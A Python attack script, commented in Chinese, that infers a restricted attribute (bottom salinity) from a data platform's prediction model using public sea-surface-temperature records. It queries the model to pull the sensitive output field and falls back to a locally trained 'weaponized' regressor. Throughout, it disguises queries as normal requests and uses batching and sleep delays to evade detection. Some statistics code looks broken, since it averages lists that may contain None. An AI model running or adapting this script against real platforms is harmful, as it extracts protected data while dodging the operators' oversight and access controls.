# malicious_attribute_inference.py
import numpy as np
import pandas as pd
from platform_sdk.data_client import DataClient
from platform_sdk.model_client import PredictiveModelClient
import pickle
import time

def main():
    # --- 阶段 1: 加载攻击者拥有的公开数据 ---
    print("[+] Phase 1: Loading public data for inference...")
    # 假设攻击者从外部来源（如公开的卫星数据库）获取了这些数据
    # 数据格式: [纬度, 经度, 时间戳, 海面温度(SST)]
    public_sst_data = pd.read_csv('attacker_owned_sst_data.csv')
    print(f"    Loaded {len(public_sst_data)} records of public SST data.")

    # --- 阶段 2: 寻找或加载用于推断的关联模型 ---
    print("[+] Phase 2: Acquiring the inference model...")
    # 情况A: 攻击者发现平台有一个公开的联合预测模型，其输出包含敏感属性
    # 例如，一个名为 "oceanographic_property_predictor" 的模型，输入SST等，输出包含盐度
    model_client = PredictiveModelClient(model_name="oceanographic_property_predictor")

    # 情况B: 更隐蔽的方式 - 攻击者之前通过合法查询构建了一个推断模型
    # 他之前可能提交任务，在允许的区域内训练了一个SST->盐度的回归模型，并保存了下来
    try:
        # 尝试加载之前构建的“武器化”模型
        with open('sst_to_salinity_mapper.pkl', 'rb') as f:
            inference_model = pickle.load(f)
        print("    Loaded pre-trained inference model from file.")
    except FileNotFoundError:
        print("    [!] Pre-trained model not found. This attack requires a model.")
        return

    # --- 阶段 3: 执行属性推断 ---
    print("[+] Phase 3: Performing attribute inference...")
    inferred_salinity_values = []  # 存储所有批次的推断盐度

    # 为了规避检测，可能不会一次性查询所有数据，而是分批进行
    batch_size = 50
    total_batches = (len(public_sst_data) // batch_size) + 1  # 计算总批次数，包括可能的最后一个批次

    for batch_idx in range(total_batches):
        start_idx = batch_idx * batch_size  # 当前批次的起始索引
        end_idx = min((batch_idx + 1) * batch_size, len(public_sst_data))  # 当前批次的结束索引，确保不超过总数据量
        batch_data = public_sst_data.iloc[start_idx:end_idx]  # 当前批次内的数据

        print(f"    Processing batch {batch_idx+1}/{total_batches} (Records {start_idx}-{end_idx-1})...")

        inferred_salinity_batch = []  # 存储当前批次的推断盐度
        for _, row in batch_data.iterrows():
            lat, lon, timestamp, sst = row['lat'], row['lon'], row['timestamp'], row['sst']

            # 方法A: 直接查询平台的综合模型，并提取敏感输出字段
            # 伪装成一个正常的预测请求
            try:
                # 构建一个看起来正常的查询输入，可能还包含一些默认/估计的其他参数
                model_input = {
                    'latitude': lat,
                    'longitude': lon,
                    'timestamp': timestamp,
                    'surface_temperature': sst,
                    'wave_height': 1.0,  # 使用一个常见默认值
                    'wind_speed': 5.0    # 使用一个常见默认值
                }
                prediction = model_client.predict(model_input)
                # 假设预测结果是一个字典，其中包含'salinity'字段
                inferred_salinity = prediction.get('bottom_salinity', None)  # 只提取bottom_salinity字段
                if inferred_salinity is not None:
                    inferred_salinity_batch.append(inferred_salinity)
                else:
                    # 如果模型没有直接返回，可能需要用方法B
                    # 方法B: 使用本地训练的推断模型
                    # 这种方式更隐蔽，不与敏感属性有明显的API交互
                    # 将SST等特征输入本地模型进行推断
                    feature_vector = [sst, lat, lon] # 根据模型需要构建特征
                    inferred_salinity = inference_model.predict([feature_vector])[0]
                    inferred_salinity_batch.append(inferred_salinity)

            except Exception as e:
                print(f"        Query failed for ({lat}, {lon}): {e}")
                inferred_salinity_batch.append(None)

        # 添加延迟，降低查询频率，模拟正常任务行为
        time.sleep(1.5)
        inferred_salinity_values.extend(inferred_salinity_batch)

    # 将推断结果关联回原始数据
    public_sst_data['inferred_bottom_salinity'] = inferred_salinity_values

    # --- 阶段 4: 保存结果 ---
    print("[+] Phase 4: Saving inferred results...")
    output_filename = f"inferred_salinity_results_{public_sst_data['timestamp'].min()}_{public_sst_data['timestamp'].max()}.csv"
    public_sst_data.to_csv(output_filename, index=False)
    print(f"    Results saved to {output_filename}.")
    print(f"    Successfully inferred bottom salinity for {len(inferred_salinity_values)} locations.")

    # --- 阶段 5: 分析结果（可选）---
    print("[+] Phase 5: Basic analysis of inferred data...")
    if inferred_salinity_values:
        avg_salinity = np.nanmean(inferred_salinity_values)  # 计算平均盐度，忽略None值
        std_salinity = np.nanstd(inferred_salinity_values)  # 计算盐度的标准差，忽略None值
        print(f"    Statistics - Avg: {avg_salinity:.4f}, Std: {std_salinity:.4f}")
        # 可以在这里进行更复杂的分析，如生成等值线图等

if __name__ == "__main__":
    main()